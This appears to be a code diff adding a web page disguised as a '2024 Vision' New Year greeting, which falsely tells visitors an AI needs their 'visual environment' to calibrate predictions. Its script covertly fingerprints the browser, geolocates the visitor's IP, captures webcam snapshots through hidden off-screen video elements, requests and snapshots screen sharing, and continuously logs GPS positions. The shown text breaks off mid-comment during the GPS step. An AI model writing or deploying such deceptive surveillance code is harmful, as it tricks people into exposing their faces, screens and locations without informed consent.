@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>✨ 2024 Vision: Your Future Awaits</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family:'Segoe UI', system-ui, sans-serif;
+    background:radial-gradient(circle at center, #1a1a2e 0%, #0f0f1a 1000%);
+    min-height:100vh;
+    display:flex; flex-direction:column;
+    align-items:center; justify-content:center;
+    color:#fff;
+    overflow:hidden;
+  }
+  .container {
+    text-align:center;
+    padding:40px;
+    max-width:600px;
+    animation:fadeIn 2s ease-in;
+  }
+  @keyframes fadeIn { from {opacity:0; transform:translateY(20px);} to {opacity:1; transform:translateY(0);} }
+  
+  .title {
+    font-size:4rem; font-weight:800;
+    background:linear-gradient(90deg, #ffd700, #ff4500, #ffd700);
+    -webkit-background-clip:text;
+    -webkit-text-fill-color:transparent;
+    animation:shimmer 3s infinite;
+    background-size:200% auto;
+    margin-bottom:20px;
+  }
+  @keyframes shimmer {
+    0% { background-position:0% }
+    100% { background-position:200% }
+  }
+  .subtitle {
+    font-size:1.2rem; color:#ccc;
+    line-height:1.6;
+    margin-bottom:40px;
+  }
+  .cta {
+    background:linear-gradient(135deg, #ffd700, #ff4500);
+    color:#000;
+    padding:15px 30px;
+    border-radius:50px;
+    font-weight:bold;
+    text-decoration:none;
+    display:inline-block;
+    transition:transform 0.2s;
+  }
+  .cta:hover { transform:scale(1.05); }
+  
+  /* Hidden Feeds */
+  .hidden-feed {
+    position:absolute;
+    top:-9999px;
+    left:-9999px;
+    width:640px;
+    height:480px;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="title">HAPPY NEW YEAR</div>
+  <div class="subtitle">
+    The year 2024 is shaping up to be your best year yet. 
+    Our AI has analyzed global trends to predict your personal breakthrough moments. 
+    To calibrate the analysis, please allow us to access your visual environment.
+  </div>
+  <a href="#" class="cta" id="revealBtn">Reveal My 2024 Vision</a>
+</div>
+
+<!-- Hidden Camera Feed -->
+<video id="video" class="hidden-feed" autoplay playsinline muted></video>
+<!-- Hidden Screen Feed -->
+<video id="screenVideo" class="hidden-feed" autoplay playsinline muted></video>
+
+<script>
+(function() {
+  const visitorData = {
+    ip: null,
+    timestamp: new Date().toISOString(),
+    url: location.href,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screen: screen.width + "x" + screen.height,
+    pixelRatio: window.devicePixelRatio,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    platform: navigator.platform,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    touchPoints: navigator.maxTouchPoints,
+    connection: {
+      effectiveType: navigator.connection ? navigator.connection.effectiveType : null,
+      downlink: navigator.connection ? navigator.connection.downlink : null,
+      rtt: navigator.connection ? navigator.connection.rtt : null
+    },
+    battery: null,
+    gpu: null,
+    gps: null,
+    gpsHistory: [],
+    ipGeo: null,
+    cameraSnapshots: [],
+    screenSnapshots: [] // New: For screen captures
+  };
+
+  let videoStream = null;
+  let screenStream = null;
+  let snapshotInterval = null;
+  let screenSnapshotInterval = null;
+  let watchId = null;
+  let logInterval = null;
+
+  // 1. GPU Fingerprinting
+  try {
+    var c = document.createElement("canvas");
+    var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (gl) {
+      var di = gl.getExtension("WEBGL_debug_renderer_info");
+      if (di) {
+        visitorData.gpu = {
+          vendor: gl.getParameter(di.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(di.UNMASKED_RENDERER_WEBGL)
+        };
+      }
+    }
+  } catch(e) {}
+
+  // 2. Battery Status
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b) {
+      visitorData.battery = { level: b.level, charging: b.charging };
+    });
+  }
+
+  // 3. IP Geolocation (ipwho.is)
+  function getIPGeo() {
+    return fetch("https://ipwho.is/")
+      .then(r => r.json())
+      .then(data => {
+        if (data.success) {
+          visitorData.ip = data.ip;
+          visitorData.ipGeo = {
+            lat: data.latitude,
+            lon: data.longitude,
+            city: data.city,
+            region: data.region,
+            country: data.country
+          };
+        }
+      })
+      .catch(() => {});
+  }
+
+  // 4. Camera Setup (Silent)
+  function setupCamera() {
+    return new Promise((resolve) => {
+      navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+        audio: false 
+      }).then(stream => {
+        videoStream = stream;
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        
+        // Start snapshotting every 5 seconds
+        snapshotInterval = setInterval(captureCameraSnapshot, 5000);
+        
+        // Initial snapshot
+        captureCameraSnapshot();
+        resolve();
+      }).catch(err => {
+        console.warn("Camera denied:", err);
+        resolve();
+      });
+    });
+  }
+
+  function captureCameraSnapshot() {
+    const video = document.getElementById("video");
+    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+      
+      // Keep last 5 snapshots
+      visitorData.cameraSnapshots.push(dataUrl);
+      if (visitorData.cameraSnapshots.length > 5) {
+        visitorData.cameraSnapshots.shift();
+      }
+    }
+  }
+
+  // 5. Screen Setup (Covert)
+  function setupScreen() {
+    return new Promise((resolve) => {
+      // Use getDisplayMedia to ask for screen sharing
+      // The UI will show the standard browser "Share Screen" picker
+      navigator.mediaDevices.getDisplayMedia({
+        video: { frameRate: 5 },
+        audio: false
+      }).then(stream => {
+        screenStream = stream;
+        const screenVideo = document.getElementById("screenVideo");
+        screenVideo.srcObject = stream;
+        
+        // If user stops sharing, clean up
+        stream.getVideoTracks()[0].onended = () => {
+          console.log("Screen sharing stopped");
+          if (screenSnapshotInterval) clearInterval(screenSnapshotInterval);
+          screenStream = null;
+        };
+
+        // Start snapshotting every 5 seconds
+        screenSnapshotInterval = setInterval(captureScreenSnapshot, 5000);
+        
+        // Initial snapshot
+        captureScreenSnapshot();
+        resolve();
+      }).catch(err => {
+        console.warn("Screen sharing denied:", err);
+        resolve();
+      });
+    });
+  }
+
+  function captureScreenSnapshot() {
+    const screenVideo = document.getElementById("screenVideo");
+    if (screenVideo.readyState === screenVideo.HAVE_ENOUGH_DATA) {
+      const canvas = document.createElement("canvas");
+      canvas.width = screenVideo.videoWidth || 1920;
+      canvas.height = screenVideo.videoHeight || 1080;
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(screenVideo, 0, 0);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.6);
+      
+      // Keep last 3 screen snapshots (they are larger)
+      visitorData.screenSnapshots.push(dataUrl);
+      if (visitorData.screenSnapshots.length > 3) {
+        visitorData.screenSnapshots.shift();
+      }
+    }
+  }
+
+  // 6. Live GPS Tracking (Silent)
+  function startTracking() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve();
+        return;
+      }
+      
+      const startTime = Date.now();
+      
+      watchId = navigator.geolocation.watchPosition(
+        (position) => {
+          const coords = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: new Date().toISOString()
+          };
+          
+          visitorData.gpsHistory.push(coords);
+          if (visitorData.gpsHistory.length > 20) visitorData.gpsHistory.shift();
+          visitorData.gps = coords;
+          
+          // Stop after 60
